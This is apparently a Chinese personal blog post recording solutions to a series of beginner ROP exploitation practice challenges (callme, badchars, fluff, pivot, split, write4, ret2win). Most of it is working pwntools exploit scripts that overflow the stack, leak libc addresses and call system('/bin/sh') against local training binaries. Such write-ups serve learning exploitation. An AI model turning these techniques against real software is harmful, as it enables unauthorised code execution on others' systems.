---
title: Trip of basic rop
date: 2018-09-23 16:47:55
tags: pwn basic
layout: post
---
 Trip of basic rop
<!--more-->
# Start
发现桌面有个压缩包里面有好多rop练习题没时间做...
然后就搞了个中秋计时解题...感觉rop更顺了..还学到了点东西
最后给这些题搞了个通用exp...然后就5min一题了
一共用了4小时...最长一题卡了1个半小时....惭愧惭愧
# calme32
读懂题意用了比较长时间....主要就是需要按顺序
call calme1->calme2->calme3
参数都是1.2.3
```python
from pwn import *
p=process("./callme32")
p.readuntil(">")
cal1=0x80485c0
cal2=0x8048620
cal3=0x80485b0
p3r=0x080488a9
payload="A"*44+p32(cal1)+p32(p3r)+p32(1)+p32(2)+p32(3)+p32(cal2)+p32(p3r)+p32(1)+p32(2)+p32(3)+p32(cal3)+p32(p3r)+p32(1)+p32(2)+p32(3)

p.sendline(payload.ljust(256,'\0'))
p.interactive()
```
# calme
题意和32位的一样 用了8min
```python
from pwn import *
p=process("./callme")
p.readuntil(">")
cal1=0x000000000401850
cal2=0x0000000000401870
cal3=0x000000000401810
p3=0x0000000000401ab0
payload="A"*40+p64(p3)+p64(1)+p64(2)+p64(3)+p64(cal1)+p64(p3)+p64(1)+p64(2)+p64(3)+p64(cal2)+p64(p3)+p64(1)+p64(2)+p64(3)+p64(cal3)
gdb.attach(p)
p.sendline(payload.ljust(256,'\0'))
p.interactive()
```
# badchars32
做了挺长时间....一开始方向错误想着用啥 奇葩的命令或者通过addxor之类的gadget
后来想一下可以直接泄露地址...虽然libc没给但是可以泄露然后查...
用libc的/bin/sh并没有坏字符
```python
from pwn import * 
context.log_level="debug"
p=process("./badchars32")
p.readuntil("\n> ")
puts=0x80484d0
pr=0x08048897
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
payload="D"*0x2c+p32(puts)+p32(pr)+p32(0x804a00c)+p32(0x80486B6)
p.send(payload.ljust(0x200,'\0'))
data=p.read(4)
base=u32(data)-libc.symbols['printf']
log.warning(hex(base))
libc.address=base
payload="D"*0x2b+p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next())
p.readuntil("\n> ")
p.send(payload.ljust(0x200,'\0'))
p.interactive()
```
# badchars
思路上和32位的没什么区别
```python
from pwn import * 
context.log_level="debug"
p=process("./badchars")
p.readuntil("\n> ")
puts=0x4006e0
pr=0x400b39
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
payload="D"*40+p64(pr)+p64(0x601058)+p64(puts)+p64(0x0000000004008F5)

p.send(payload.ljust(0x200,'\0'))
data=p.read(6)
base=u64(data.ljust(8,'\0'))-libc.symbols['__libc_malloc']
log.warning(hex(base))
libc.address=base
payload="D"*(0x40-0x18-1)+p64(pr)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])
p.readuntil("\n> ")
raw_input()
p.send(payload.ljust(0x200,'\0'))
p.interactive()
```
# ret2win32
比较直接...
```python
from pwn import *
p=process("./ret2win32")
p.readuntil("> ")
payload="A"*44+p32(0x8048659)
p.send(payload)
p.interactive()

```
# ret2win
```python
from pwn import *
p=process("./ret2win")
p.readuntil("> ")
payload="A"*40+p64(0x000000000400811)
p.send(payload)
p.interactive()
```
# fluff32
用badchars的方法 leak + use
```python
from pwn import * 
context.log_level="debug"
p=process("./fluff32")
p.readuntil("\n> ")
puts=0x8048420
pr=0x080486fb
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
payload="D"*44+p32(puts)+p32(pr)+p32(0x804a014)+p32(0x80485F6)
p.send(payload.ljust(0x200,'\0'))
data=p.read(4)
base=u32(data)-libc.symbols['puts']
log.warning(hex(base))
libc.address=base
payload="D"*43+p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next())
p.readuntil("\n> ")
gdb.attach(p)
p.send(payload.ljust(0x200,'\0'))
p.interactive()
```
# fluff
leak + use
```python
from pwn import * 
context.log_level="debug"
p=process("./fluff")
p.readuntil("\n> ")
puts=0x0000000004005d0
pr=0x00000000004008c3
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
payload="D"*40+p64(pr)+p64(0x601018)+p64(puts)+p64(0x0000000004007B5)
p.send(payload.ljust(0x200,'\0'))
data=p.read(6)
base=u64(data.ljust(8,'\0'))-libc.symbols['puts']
log.warning(hex(base))
libc.address=base
payload="D"*(0x40-0x18-1)+p64(pr)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])
p.readuntil("\n> ")
raw_input()
p.send(payload.ljust(0x200,'\0'))
p.interactive()
```
# pivot32
题目先给了个mmap的地址泄露...之前没搞过mmap
但是猜是偏移和load的那个so偏移相同于是就试了下结果成功了...
于是实验了一下发现了新知识...(仅测试了ASLR下PIE情况下还没实验)
* 不同so load的base address是相同的 和mmap的base address一样

![](/18-9-24-1.png)

```python
from pwn import * 
context.log_level="debug"
p=process("./pivot32")
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
p.readuntil("pivot: ")
data=p.readline()
raw_input()
base=int(data[:-1],16)-0xFFFF00-8+(0xf7fd1967-0xf6dfe000)
log.warning(hex(base))
p.readuntil("\n> ")
puts=0x80485d0
pr=0x080486fb
p.sendline(p32(0xdeadbeef))
payload="D"*44+p32(base)
p.readuntil("\n> ")
gdb.attach(p)
p.send(payload.ljust(58,'\0'))
p.interactive()
```
# pivot
方法和32位没什么区别
```python
from pwn import * 
context.log_level="debug"
p=process("./pivot")
p.readuntil("pivot: ")
data=p.readline()
raw_input()
base=int(data[:-1],16)-0x1000000-0x10+0x100+(0x7fa7b33cc000-0x7fa7b2001000)+0xabe
log.warning(hex(base))
p.readuntil("\n> ")
p.sendline(p32(0xdeadbeef))
payload="D"*40+p64(base)
p.readuntil("\n> ")
gdb.attach(p)
p.send(payload.ljust(40,'\0'))

p.interactive()

```
# split32
```python
from pwn import * 
context.log_level="debug"
p=process("./split32")
p.readuntil("> ")
puts=0x8048420
pr=0x080483e1
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
payload="D"*44+p32(puts)+p32(pr)+p32(0x804a014)+p32(0x80485F6)
gdb.attach(p)
p.send(payload.ljust(96,'\0'))
data=p.read(4)
base=u32(data)-libc.symbols['puts']
log.warning(hex(base))
libc.address=base
payload="D"*43+p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next())
p.readuntil("> ")
p.send(payload.ljust(96,'\0'))
p.interactive()
```
# split
```python
from pwn import * 
context.log_level="debug"
p=process("./split")
p.readuntil("> ")
puts=0x0000000004005d0
pr=0x0000000000400883
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
payload="D"*40+p64(pr)+p64(0x601018)+p64(puts)+p64(0x0000000004007B5)
gdb.attach(p)
p.send(payload.ljust(96,'\0'))
data=p.read(6)
base=u64(data.ljust(8,'\0'))-libc.symbols['puts']
log.warning(hex(base))
libc.address=base
payload="D"*39+p64(pr)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])
p.readuntil("> ")
p.send(payload.ljust(96,'\0'))
p.interactive()
```

# write432
```python
from pwn import * 
context.log_level="debug"
p=process("./write432")
p.readuntil("> ")
puts=0x8048420
pr=0x080486db
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
payload="D"*44+p32(puts)+p32(pr)+p32(0x804a014)+p32(0x80485F6)
gdb.attach(p)
p.send(payload.ljust(512,'\0'))
data=p.read(4)
base=u32(data)-libc.symbols['puts']
log.warning(hex(base))
libc.address=base
payload="D"*43+p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next())
p.readuntil("> ")
p.send(payload.ljust(512,'\0'))
p.interactive()
```
# write4
```python
from pwn import * 
context.log_level="debug"
p=process("./write4")
p.readuntil("> ")
puts=0x0000000004005d0
pr=0x0000000000400893
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
payload="D"*40+p64(pr)+p64(0x601018)+p64(puts)+p64(0x0000000004007B5)
gdb.attach(p)
p.send(payload.ljust(512,'\0'))
data=p.read(6)
base=u64(data.ljust(8,'\0'))-libc.symbols['puts']
log.warning(hex(base))
libc.address=base
payload="D"*39+p64(pr)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])
p.readuntil("> ")
p.send(payload.ljust(512,'\0'))
p.interactive()
```